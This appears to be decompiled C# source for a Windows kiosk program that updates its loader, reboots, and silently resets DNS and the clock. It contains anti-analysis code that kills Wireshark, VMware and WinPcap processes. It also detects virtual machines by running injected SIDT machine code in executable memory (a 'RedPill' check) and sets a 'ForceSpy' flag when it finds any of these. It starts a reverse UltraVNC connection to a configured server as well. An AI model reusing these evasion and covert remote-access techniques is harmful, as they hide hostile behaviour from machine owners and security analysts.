using GLib;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Kiosk
{
	internal static class Program
	{
		private delegate void MethodInvoker();

		public class VirtualMemoryPtr : SafeHandle
		{
			public readonly IntPtr AllocatedPointer;

			private readonly IntPtr ProcessHandle;

			private readonly IntPtr MemorySize;

			private bool Disposed;

			public override bool IsInvalid => Disposed;

			public VirtualMemoryPtr(int memorySize)
				: base(IntPtr.Zero, ownsHandle: true)
			{
				ProcessHandle = VirtualMemoryManager.GetCurrentProcessHandle();
				MemorySize = (IntPtr)memorySize;
				AllocatedPointer = VirtualMemoryManager.AllocExecutionBlock(memorySize, ProcessHandle);
				Disposed = false;
			}

			public static implicit operator IntPtr(VirtualMemoryPtr virtualMemoryPointer)
			{
				return virtualMemoryPointer.AllocatedPointer;
			}

			protected override bool ReleaseHandle()
			{
				if (!Disposed)
				{
					Disposed = true;
					GC.SuppressFinalize(this);
					VirtualMemoryManager.VirtualFreeEx(ProcessHandle, AllocatedPointer, MemorySize);
				}
				return true;
			}
		}

		private class VirtualMemoryManager
		{
			[Flags]
			private enum AllocationType : uint
			{
				Commit = 0x1000,
				Reserve = 0x2000,
				Reset = 0x80000,
				Physical = 0x400000,
				TopDown = 0x100000
			}

			[Flags]
			private enum ProtectionOptions : uint
			{
				Execute = 0x10,
				PageExecuteRead = 0x20,
				PageExecuteReadWrite = 0x40
			}

			[Flags]
			private enum MemoryFreeType : uint
			{
				Decommit = 0x4000,
				Release = 0x8000
			}

			[DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
			internal static extern IntPtr GetCurrentProcessHandle();

			[DllImport("kernel32.dll")]
			internal static extern IntPtr GetCurrentProcess();

			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, uint flProtect);

			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);

			public static IntPtr AllocExecutionBlock(int size, IntPtr hProcess)
			{
				IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)size, AllocationType.Commit | AllocationType.Reserve, 64u);
				if (intPtr == IntPtr.Zero)
				{
					throw new Win32Exception();
				}
				uint lpflOldProtect = 0u;
				if (!VirtualProtectEx(hProcess, intPtr, (IntPtr)size, 64u, ref lpflOldProtect))
				{
					throw new Win32Exception();
				}
				return intPtr;
			}

			public static IntPtr AllocExecutionBlock(int size)
			{
				return AllocExecutionBlock(size, GetCurrentProcessHandle());
			}

			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, IntPtr dwFreeType);

			public static bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize)
			{
				bool flag = VirtualFreeEx(hProcess, lpAddress, dwSize, (IntPtr)16384L);
				if (!flag)
				{
					throw new Win32Exception();
				}
				return flag;
			}

			public static bool VirtualFreeEx(IntPtr lpAddress, IntPtr dwSize)
			{
				return VirtualFreeEx(GetCurrentProcessHandle(), lpAddress, dwSize);
			}
		}

		[STAThread]
		private static void Main()
		{
			bool flag = true;
			flag = false;
			Check_DNS();
			string text = "c:\\kiosk\\Loader.exe";
			string text2 = "c:\\kiosk\\_Loader.exe";
			string path = "c:\\kiosk\\_Loader.exe.ver";
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\kiosk.options.tmp";
			if (File.Exists(path2))
			{
				try
				{
					File.Delete(path2);
				}
				catch
				{
				}
			}
			flag = true;
			if (File.Exists(text) && File.Exists(text2) && File.Exists(path) && !FileEquals(text, text2) && Util.HashFile(text2, _create: false) && FindAndKillProcess("Loader"))
			{
				Thread.Sleep(2000);
				if (!FindAndKillProcess("Loader"))
				{
					try
					{
						File.Delete(text);
					}
					catch
					{
					}
					Thread.Sleep(1000);
					try
					{
						File.Copy(text2, text);
					}
					catch
					{
					}
					Thread.Sleep(1000);
					Reboot();
					Thread.Sleep(10000);
					Application.Exit();
				}
			}
			flag = true;
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(defaultValue: false);
			Configuracion _opc = new Configuracion();
			_opc.Set_AppName("kiosk".ToLower());
			flag = true;
			if (File.Exists(_opc.CfgFileFull + ".tmp"))
			{
				try
				{
					File.Delete(_opc.CfgFileFull + ".tmp");
				}
				catch
				{
				}
			}
			flag = true;
			_opc.Load_Net();
			flag = true;
			if (_opc.Reset == 1)
			{
				flag = true;
				_opc.Save_Net();
			}
			flag = true;
			if (_opc.MACLAN != "0")
			{
				_opc.Save_Net($"{_opc.MACLAN}", "cfg");
			}
			flag = true;
			flag = false;
			Update_DateTime();
			flag = true;
			if (_opc.unique)
			{
				Process[] processesByName = Process.GetProcessesByName(Assembly.GetExecutingAssembly().GetName().Name);
				if (processesByName.Length > 1)
				{
					return;
				}
			}
			Configuracion.CleanUpDisk();
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\uvnc bvba\\UltraVNC\\winvnc.exe";
			if (File.Exists(text3) && Configuracion.VNC_Check_Timestamp() == 1)
			{
				Process.Start(text3, "-connect " + _opc.Server_VNC + ":5500 -run");
			}
			flag = true;
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
			string path3 = folderPath + "\\Toolwiz Time Freeze 2014\\ToolwizTimeFreeze.exe";
			if (File.Exists(path3) && Configuracion.Freeze_Check() == 0 && Configuracion.Freeze_Check_Timestamp() == 0)
			{
				Configuracion.Freeze_On();
			}
			flag = true;
			if (_opc.VersionPRG == "update")
			{
				Process.Start("shutdown.exe", "/r");
				return;
			}
			for (int i = 0; i < 5; i++)
			{
				if (PingTest())
				{
					break;
				}
				for (int j = 0; j < 100; j++)
				{
					Application.DoEvents();
					Thread.Sleep(10);
				}
			}
			flag = true;
			if (!PingTest())
			{
				MSGBOX_Timer mSGBOX_Timer = new MSGBOX_Timer("No INTERNET Connection. Check Network cable, network parameters or WIFI", "Ok", 5);
				mSGBOX_Timer.ShowDialog();
			}
			Configuracion.Access_Log("Load Kiosk");
			flag = true;
			if (FindWinPCapProcess() || FindVMWareProcess() || FindWiresharkProcess() || RedPill() == 1)
			{
				_opc.ForceSpy = true;
			}
			flag = true;
			Application.Run(new MainWindow(ref _opc));
			flag = false;
			if (FindAndKillProcess("Loader"))
			{
				Thread.Sleep(2000);
				if (!FindAndKillProcess("Loader"))
				{
					RunProcess(text);
					Application.Exit();
				}
			}
		}

		private static bool Run_Cmd(string _param)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/C \"" + _param + "\"";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			return true;
		}

		public static void Update_DateTime()
		{
			int num = 0;
			Process process = new Process();
			string[] array = new string[12]
			{
				"net",
				"stop \"w32time\"",
				"w32tm",
				"/config /manualpeerlist:\"0.europe.pool.ntp.org 1.europe.pool.ntp.org 2.europe.pool.ntp.org 3.europe.pool.ntp.org\"",
				"w32tm",
				"/config /syncfromflags:MANUAL",
				"w32tm",
				"/config /reliable:YES",
				"net",
				"start \"w32time\"",
				"w32tm",
				"/resync"
			};
			DateTime now = DateTime.Now;
			int num2 = 0;
			do
			{
				for (int i = 0; i < array.Length; i += 2)
				{
					try
					{
						process.StartInfo.FileName = array[i];
						process.StartInfo.Arguments = array[i + 1];
						process.StartInfo.CreateNoWindow = true;
						process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process.Start();
						Thread.Sleep(1000);
						process.WaitForExit();
					}
					catch (Exception)
					{
						num++;
						for (int j = 0; j < 10; j++)
						{
							Application.DoEvents();
							Thread.Sleep(200);
						}
					}
				}
				now = DateTime.Now;
				num2++;
			}
			while (now.Year < 2017 && num2 < 4);
			if (now.Year >= 2017)
			{
				return;
			}
			Run_Cmd("date 1-2-2017");
			if (DateTime.Now.Year >= 2017)
			{
				return;
			}
			Run_Cmd("date 1-2-2017");
			if (DateTime.Now.Year >= 2017)
			{
				return;
			}
			Run_Cmd("date 2/1/2017");
			if (DateTime.Now.Year < 2017)
			{
				Run_Cmd("date 2/1/2017");
				if (DateTime.Now.Year < 2017)
				{
					num++;
				}
			}
		}

		private static bool FileEquals(string path1, string path2)
		{
			byte[] array = File.ReadAllBytes(path1);
			byte[] array2 = File.ReadAllBytes(path2);
			if (array.Length == array2.Length)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] != array2[i])
					{
						return false;
					}
				}
				return true;
			}
			return false;
		}

		public static bool FindAndKillProcess(string name)
		{
			name = name.ToLower();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.ToLower().StartsWith(name))
				{
					process.Kill();
					return true;
				}
			}
			return false;
		}

		private static void Reboot()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\uvnc bvba\\UltraVNC\\winvnc.exe";
			if (File.Exists(path) && Configuracion.VNC_Running())
			{
				Configuracion.VNC_Build_Timestamp();
			}
			Process.Start("shutdown.exe", "/r /t 2");
		}

		public static bool FindWiresharkProcess()
		{
			string value = "wireshark".ToLower();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.ToLower().StartsWith(value))
				{
					process.Kill();
					return true;
				}
			}
			return false;
		}

		private unsafe static int RedPill()
		{
			byte[] array = new byte[8]
			{
				15,
				1,
				13,
				0,
				0,
				0,
				0,
				195
			};
			fixed (byte* ptr2 = new byte[6])
			{
				fixed (byte* ptr = array)
				{
					*(int*)(ptr + 3) = (int)ptr2;
					using (VirtualMemoryPtr virtualMemoryPointer = new VirtualMemoryPtr(array.Length))
					{
						Marshal.Copy(array, 0, virtualMemoryPointer, array.Length);
						MethodInvoker methodInvoker = (MethodInvoker)Marshal.GetDelegateForFunctionPointer(virtualMemoryPointer, typeof(MethodInvoker));
						methodInvoker();
					}
					if (ptr2[5] > 208)
					{
						return 1;
					}
					return 0;
				}
			}
		}

		public static bool FindVMWareProcess()
		{
			string value = "vmware".ToLower();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.ToLower().StartsWith(value))
				{
					process.Kill();
					return true;
				}
			}
			return false;
		}

		public static bool FindWinPCapProcess()
		{
			string value = "packet".ToLower();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.ToLower().StartsWith(value))
				{
					process.Kill();
					return true;
				}
			}
			return false;
		}

		public static bool PingTest()
		{
			Ping ping = new Ping();
			PingReply pingReply = null;
			try
			{
				pingReply = ping.Send(IPAddress.Parse("8.8.8.8"));
			}
			catch
			{
				return false;
			}
			if (pingReply.Status == IPStatus.Success)
			{
				return true;
			}
			return false;
		}

		public static bool RunProcess(string name)
		{
			Process process = new Process();
			try
			{
				process.StartInfo.WorkingDirectory = "c:\\Kiosk\\";
				process.StartInfo.FileName = name;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
				process.Start();
			}
			catch
			{
				return false;
			}
			return true;
		}

		public static void GetIP(out string[] enableDHCP, out string[] ipAdresses, out string[] subnets, out string[] gateways, out string[] dnses, out bool dhcp)
		{
			ipAdresses = null;
			subnets = null;
			gateways = null;
			dnses = null;
			enableDHCP = null;
			dhcp = false;
			try
			{
				ManagementClass managementClass = new ManagementClass("Win32_NetworkAdapterConfiguration");
				try
				{
					ManagementObjectCollection instances = managementClass.GetInstances();
					try
					{
						foreach (ManagementObject item in instances)
						{
							if ((bool)item["DHCPEnabled"])
							{
								dhcp = true;
							}
							if ((bool)item["ipEnabled"])
							{
								ipAdresses = (string[])item["IPAddress"];
								subnets = (string[])item["IPSubnet"];
								gateways = (string[])item["DefaultIPGateway"];
								dnses = (string[])item["DNSServerSearchOrder"];
								break;
							}
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		public static void SetDNS(string[] _dns)
		{
			ManagementClass managementClass = new ManagementClass("Win32_NetworkAdapterConfiguration");
			ManagementObjectCollection instances = managementClass.GetInstances();
			foreach (ManagementObject item in instances)
			{
				if ((bool)item["IPEnabled"])
				{
					ManagementBaseObject methodParameters = item.GetMethodParameters("SetDNSServerSearchOrder");
					methodParameters["DNSServerSearchOrder"] = _dns;
					item.InvokeMethod("SetDNSServerSearchOrder", methodParameters, null);
				}
			}
		}

		private static void Check_DNS()
		{
			bool dhcp = false;
			GetIP(out string[] _, out string[] _, out string[] _, out string[] _, out string[] dnses, out dhcp);
			int num = 0;
			if (dnses == null)
			{
				num = 1;
			}
			else
			{
				int num2 = 0;
				for (int i = 0; i < dnses.Length; i++)
				{
					if (dnses[i] == "8.8.8.8")
					{
						num2++;
					}
					if (dnses[i] == "8.8.4.4")
					{
						num2++;
					}
				}
				if (num2 < 2)
				{
					num = 1;
				}
			}
			if (num == 1)
			{
				string[] dNS = new string[2]
				{
					"8.8.8.8",
					"8.8.4.4"
				};
				SetDNS(dNS);
			}
		}
	}
}
